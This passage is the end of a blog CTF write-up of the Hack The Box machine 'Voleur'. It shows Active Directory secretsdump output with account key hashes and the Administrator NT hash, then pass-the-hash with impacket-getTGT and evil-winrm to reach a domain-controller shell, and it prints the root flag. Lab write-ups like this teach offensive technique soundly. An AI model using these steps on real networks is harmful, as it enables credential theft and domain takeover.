</span></span><span class=line><span class=cl>krbtgt:des-cbc-md5:34ae31d073f86d20
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\r</span>yan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\r</span>yan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\r</span>yan.naylor:des-cbc-md5:4376f7917a197a5b
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\m</span>arie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\m</span>arie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\m</span>arie.bryant:des-cbc-md5:cdf1492604d3a220
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\l</span>acey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\l</span>acey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\l</span>acey.miller:des-cbc-md5:6eef922076ba7675
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_ldap:des-cbc-md5:1ab0fbfeeaef5776
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_backup:des-cbc-md5:7ab513f8ab7f765e
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_iis:des-cbc-md5:70ce25431c577f92
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\j</span>eremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\j</span>eremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\j</span>eremy.combs:des-cbc-md5:192f702abff75257
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_winrm:des-cbc-md5:32b61fb92a7010ab
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Cleaning up... 
</span></span></code></pre></td></tr></table></div></div><p>The secrets extraction phase utilized Impacket&rsquo;s secretsdump tool to parse the Active Directory database and registry hives. This process extracted all domain user password hashes, including the Domain Administrator account, effectively providing complete domain compromise.</p><p><strong>Administrator NT Hash :</strong> aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2</p><hr><h2 id=phase-6-domain-admin><strong>Phase 6: Domain Admin</strong><a hidden class=anchor aria-hidden=true href=#phase-6-domain-admin>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/hexhunter404/Downloads<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# ntpdate voleur.htb <span class=o>&amp;&amp;</span> impacket-getTGT voleur.htb/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 
</span></span><span class=line><span class=cl>2025-07-06 22:56:51.853291 <span class=o>(</span>+0200<span class=o>)</span> +28799.933401 +/- 0.013588 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span class=line><span class=cl>CLOCK: <span class=nb>time</span> stepped by 28799.933401
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving ticket in Administrator.ccache
</span></span><span class=line><span class=cl>                             
</span></span><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/hexhunter404/Downloads<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# <span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>/home/hexhunter404/Downloads/Administrator.ccache                                                                                                    
</span></span><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/hexhunter404/Downloads<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# ntpdate voleur.htb <span class=o>&amp;&amp;</span> evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
</span></span><span class=line><span class=cl>2025-07-06 22:57:42.293729 <span class=o>(</span>+0200<span class=o>)</span> +28799.927044 +/- 0.011306 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span class=line><span class=cl>CLOCK: <span class=nb>time</span> stepped by 28799.927044
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Evil-WinRM shell v3.7
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class=sb>`</span>quoting_detection_proc<span class=err>&#39;</span> <span class=k>for</span> module Reline
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>ocuments&gt; <span class=nb>cd</span> ..*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator&gt; <span class=nb>cd</span> Desktop
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt; dir
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                 LastWriteTime         Length Name
</span></span><span class=line><span class=cl>----                 -------------         ------ ----
</span></span><span class=line><span class=cl>-a----         1/29/2025   1:12 AM           <span class=m>2308</span> Microsoft Edge.lnk
</span></span><span class=line><span class=cl>-ar---          7/5/2025   8:38 PM             <span class=m>34</span> root.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt; cat root.txt
</span></span><span class=line><span class=cl>092ea0c8c50e977873d72cf015ba61d2
</span></span></code></pre></td></tr></table></div></div><p>The final phase utilized the extracted Administrator hash to perform a pass-the-hash attack, obtaining a Kerberos ticket without knowing the plaintext password. This technique demonstrates how compromised password hashes can be leveraged for authentication in Windows environments.</p><p>The successful acquisition of Domain Administrator privileges provided complete control over the voleur.htb domain. This level of access allows for data exfiltration, system modification, and establishment of persistent access mechanisms.</p><p><strong>Root Flag:</strong>¬†092ea0c8c50e977873d72cf015ba61d2</p><p>Writeup completed by HexHunter404 - HTB Pro Hacker #544
Machine solved on: [Date] | Writeup published on: {{ .Date.Format &ldquo;August 1, 2025&rdquo; }}</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/tags/htb/>Htb</a></li><li><a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/tags/windows/>Windows</a></li><li><a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/tags/hard/>Hard</a></li><li><a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/tags/active-directory/>Active-Directory</a></li><li><a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/tags/privilege-escalation/>Privilege-Escalation</a></li><li><a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/tags/dpapi/>Dpapi</a></li><li><a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/tags/kerberoasting/>Kerberoasting</a></li></ul><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share [HTB] Voleur - Advanced Windows Exploitation on x" href="https://x.com/intent/tweet/?text=%5bHTB%5d%20Voleur%20-%20Advanced%20Windows%20Exploitation&amp;url=https%3a%2f%2fdhiaznaidiblog.github.io%2fdhiaznaidi-blog%2fwriteups%2fhtb%2fmachines%2fvoleur%2fvoleur%2f&amp;hashtags=htb%2cwindows%2chard%2cactive-directory%2cprivilege-escalation%2cdpapi%2ckerberoasting"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share [HTB] Voleur - Advanced Windows Exploitation on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fdhiaznaidiblog.github.io%2fdhiaznaidi-blog%2fwriteups%2fhtb%2fmachines%2fvoleur%2fvoleur%2f&amp;title=%5bHTB%5d%20Voleur%20-%20Advanced%20Windows%20Exploitation&amp;summary=%5bHTB%5d%20Voleur%20-%20Advanced%20Windows%20Exploitation&amp;source=https%3a%2f%2fdhiaznaidiblog.github.io%2fdhiaznaidi-blog%2fwriteups%2fhtb%2fmachines%2fvoleur%2fvoleur%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share [HTB] Voleur - Advanced Windows Exploitation on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fdhiaznaidiblog.github.io%2fdhiaznaidi-blog%2fwriteups%2fhtb%2fmachines%2fvoleur%2fvoleur%2f&title=%5bHTB%5d%20Voleur%20-%20Advanced%20Windows%20Exploitation"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share [HTB] Voleur - Advanced Windows Exploitation on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fdhiaznaidiblog.github.io%2fdhiaznaidi-blog%2fwriteups%2fhtb%2fmachines%2fvoleur%2fvoleur%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share [HTB] Voleur - Advanced Windows Exploitation on whatsapp" href="https://api.whatsapp.com/send?text=%5bHTB%5d%20Voleur%20-%20Advanced%20Windows%20Exploitation%20-%20https%3a%2f%2fdhiaznaidiblog.github.io%2fdhiaznaidi-blog%2fwriteups%2fhtb%2fmachines%2fvoleur%2fvoleur%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share [HTB] Voleur - Advanced Windows Exploitation on telegram" href="https://telegram.me/share/url?text=%5bHTB%5d%20Voleur%20-%20Advanced%20Windows%20Exploitation&amp;url=https%3a%2f%2fdhiaznaidiblog.github.io%2fdhiaznaidi-blog%2fwriteups%2fhtb%2fmachines%2fvoleur%2fvoleur%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share [HTB] Voleur - Advanced Windows Exploitation on ycombinator" href="https://news.ycombinator.com/submitlink?t=%5bHTB%5d%20Voleur%20-%20Advanced%20Windows%20Exploitation&u=https%3a%2f%2fdhiaznaidiblog.github.io%2fdhiaznaidi-blog%2fwriteups%2fhtb%2fmachines%2fvoleur%2fvoleur%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://dhiaznaidiblog.github.io/dhiaznaidi-blog/>HexHunter404 - Cybersecurity & AI</a></span> ¬∑
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>